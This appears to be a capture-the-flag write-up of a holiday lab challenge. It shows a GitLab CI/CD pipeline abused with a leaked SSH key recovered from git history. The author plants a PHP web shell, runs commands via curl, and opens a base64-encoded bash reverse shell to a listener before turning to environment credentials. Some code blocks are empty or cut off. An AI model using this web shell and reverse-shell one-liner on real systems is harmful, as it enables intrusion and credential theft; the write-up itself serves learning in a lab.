# CI-CD Pipeline Challenge

Upon opening the terminal (and waiting a bit for it to build itself out completely) I am presented with this introduction:

Greetings Noble Player, 

Many thanks for answering our desperate cry for help!

You may have heard that some evil Sporcs have opened up a web-store selling 
counterfeit banners and flags of the many noble houses found in the land of 
the North! They have leveraged some dastardly technology to power their 
storefront, and this technology is known as PHP! 

***gasp*** 

This strorefront utilizes a truly despicable amount of resources to keep the 
website up. And there is only a certain type of Christmas Magic capable of 
powering such a thingâ€¦ an Elfen Ring!

Along with PHP there is something new we've not yet seen in our land. 
A technology called Continuous Integration and Continuous Deployment! 

Be wary! 

Many fair elves have suffered greatly but in doing so, they've managed to 
secure you a persistent connection on an internal network. 

BTW take excellent notes! 

Should you lose your connection or be discovered and evicted the 
elves can work to re-establish persistence. In fact, the sound off fans
and the sag in lighting tells me all the systems are booting up again right now.  

Please, for the sake of our Holiday help us recover the Ring and save Christmas!

## Poking Around

This is a robust challenge that doesn't really give you much to go on.

However, the following things are currently obvious:

!!! note 'What I know'
    1) I am in a docker container
    2) I have root on the docker container
    3) There is a git repository located at `http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal`.

The only reason I know of the gitlab repository is due to Tinsel Upatree informing me after solving the [Prison Escape](prisonescape.md) challenge. I suppose that counts as OSINT, right?

The host I am currently on is a fabricated host inside the Sporc's internal network. I have some rudimentary tools (a bit less than I'm used to, but beggers and choosers and all that), but certainly enough to get the job done.

I decided to use nmap to find active hosts on our `172.18.0.0/16` subnet.

!!! abstract ""
    `#!sh nmap -sP 172.18.0.0/16`

I discovered the following hosts up:

!!! abstract "Nmap Results"
    ```
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-14 17:49 GMT
    Nmap scan report for 172.18.0.1
    Host is up (0.00063s latency).
    Nmap scan report for wordpress-db.local_docker_network (172.18.0.87)
    Host is up (0.00047s latency).
    Nmap scan report for wordpress.local_docker_network (172.18.0.88)
    Host is up (0.00019s latency).
    Nmap scan report for grinchum-land.flag.net.internal (172.18.0.99)
    Host is up (0.00018s latency).
    Nmap scan report for gitlab.local_docker_network (172.18.0.150)
    Host is up (0.00028s latency).
    Nmap scan report for gitlab-runner.local_docker_network (172.18.1.149)
    Host is up (0.00019s latency).
    Nmap scan report for postgresql.local_docker_network (172.18.1.200)
    Host is up (0.00032s latency).
    Nmap scan report for redis.local_docker_network (172.18.2.87)
    Host is up (0.00051s latency).
    ```

And that's a little difficult on the eyes, so here's a more readable version of the above

!!! abstract "Better-formatted version"
    ```
    172.18.0.1
    wordpress-db.local_docker_network (172.18.0.87)
    wordpress.local_docker_network (172.18.0.88)
    grinchum-land.flag.net.internal (172.18.0.99)
    gitlab.local_docker_network (172.18.0.150)
    gitlab-runner.local_docker_network (172.18.1.149)
    postgresql.local_docker_network (172.18.1.200)
    redis.local_docker_network (172.18.2.87)
    ```

From a bit more specific nmap scans, I determined that the host `redis.local_docker_network (172.18.2.87)` had one port open that was -- you guessed it -- `redis` on port `6379`. This was a data store for quick memory access for web apps, among others. There are certainly attack vectors to consider if I have access to the redis store, but let's move on from that for now.

`gitlab-runner.local_docker_network (172.18.1.149)` did not have any open ports that I found, and `postgresql.local_docker_network (172.18.1.200)` only had port `5432/TCP` open for (surprise) PostgreSQL.

The `172.18.0.0/24` subnet was a bit more interesting.

This was a red herring. While it had a lot of ports, this was actually the host container hosting this challenge. The ports shown are forwarded to the docker hosts that are "visible" outside.

    MAC Address: 02:42:AC:12:00:96 (Unknown)
    ```

The domain was actually `flag.net.internal`, but the DNS would resolve back to the internal docker network. No matter!

## Playing With the Git Repository

As mentioned by Tinsel Upatree, I decided to poke around the repo:

!!! abstract ""
    `#!sh git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal`

Once I cloned the repo, I `cd`'d into the resulting `wordpress.flag.net.internal` directory and ran: 

!!! abstract ""
    `#!sh git log`

This gave me some interesting stuff...

Got a private key. Cool. I can do some fancy linux stuff to pull the pub and priv keys out of the diff involving the `patch` binary, but since it doesn't exist on the container I'll have to copy-paste it out and massage it a bit to look like this:

!!! note "Private Key"

    ```


With the new key, I can clone the repository as the sporx user! What I'll have to do first is start up an `ssh-agent` binary and add the key in memory. Good thing there isn't a password involved!

    Identity added: ./sporx.key (sporx@kringlecon.com)
    ```

Now by adding the ssh key, I can clone the repo again...but I wonder what else I can do?

!!! abstract ""
    `#!sh git clone git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git`

Let's modify one of the PHP files to have a comment that I can grep out.

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ vi index.php
    grinchum-land:~/wordpress.flag.net.internal$ git add index.php
    grinchum-land:~/wordpress.flag.net.internal$ git commit -m "tee hee"
    Author identity unknown

    *** Please tell me who you are.

    Run

      git config --global user.email "you@example.com"
      git config --global user.name "Your Name"

    to set your account's default identity.
    Omit --global to set the identity only in this repository.

    fatal: empty ident name (for <samways@grinchum-land.flag.net.internal>) not allowed
    grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email 
    "totally-an-orc@kringlecon.com"
    
    grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "orcy"
    ```


And the addition I made to index.php?

!!! abstract ""
    `#!php echo("<!-- agr0 -->");`

A super-innocuous line of code. The idea here is if I `curl` the site after pushing it and grep out `agr0`, it should tell me several things:

 1. I have access to modify the code.
 2. I have access to modify _executable_ code (that is, if the word `#!php echo()` doesn't show up around it).

Then, I committed and pushed.

!!! note

Then ran a curl on the site and grepped for my tag...

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -s http://172.18.0.88 | grep agr0
    <!-- agr0 -->
    ```

Success! Not only did my HTML comment show up, but the `#!php echo()` function didn't, meaning that it executed my php code!

Now let's get a little interactive shell.

## It's a Christmas Miracle! (shell access)

I created the file `xmas.php`:

!!! abstract "xmas.php"
    ```php
    <?php
    system($_REQUEST['agr0']);
    ?>
    ```

This was super simple. Any command sent to the variable `agr0` would be executed in a shell environment. Because I used the `#!php $_REQUEST['agro']` variable, I can send _either_ a GET or POST request.

I then added it, committed it, and pushed it.

!!! abstract "git commits"
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ git add .
    grinchum-land:~/wordpress.flag.net.internal$ git commit -m "merry christmas"

    ```

![Look at me](/img/elfhouse/lookatme.png)

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -s http://172.18.0.88/xmas.php?agr0=id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

Confirmed I can use post vars, which is easier than GET vars:

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -sd "agr0=id" http://172.18.0.88/xmas.php
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

So do we have bash?

!!! abstract ""
    ```sh
    grinchum-land:~/wordpress.flag.net.internal$ curl -sd "agr0=which bash" http://172.18.0.88/xmas.php
    /bin/bash
    ```

So can we kick back a shell?

![Yup](/img/elfhouse/yep-yup.gif)

First, because there are special characters that could get in the way of things, I decided to base64 encode my shell:

!!! abstract "Local"
    ```sh
    echo -n "/bin/bash -i >& /dev/tcp/172.18.0.99/9090 0>&1" | base64 -w0
    L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOC4wLjk5LzkwOTAgMD4mMQ==
    ```
Then started up a reverse shell listener:

!!! abstract "Reverse Shell"
    ```sh
    grinchum-land:~$ nc -lvnp 9090
    Listening on [0.0.0.0] (family 0, port 9090)

    ```

Then...Eagle one, Fox two!

!!! abstract ""
    ```sh
    curl -sd 'agr0=echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xOC4wLjk5LzkwOTAgMD4mMQ== | base64 -d | bash' http://172.18.0.88/xmas.php
    ```

!!! success "Caught"
    ```sh
    grinchum-land:~$ nc -lvnp 9090
    Listening on [0.0.0.0] (family 0, port 9090)
    Connection from 172.18.0.88 60556 received!

## Hacker Voice: "I'm in."

Generally, once I'm in as the `www-user` there isn't a whole lot I can _do_ per se, but there is a whole lot of information I can _read_. Specifically all the information that the web app needs to run! Database credentials, access to user login credentials (and users are notorious for re-using passwords), the works. This wordpress app runs in a docker container and most of the credentials are typically fed in to the app by means of environment variables. So I can type `env` and dump those right now:

!!! success "Environment Variables"
    ```sh
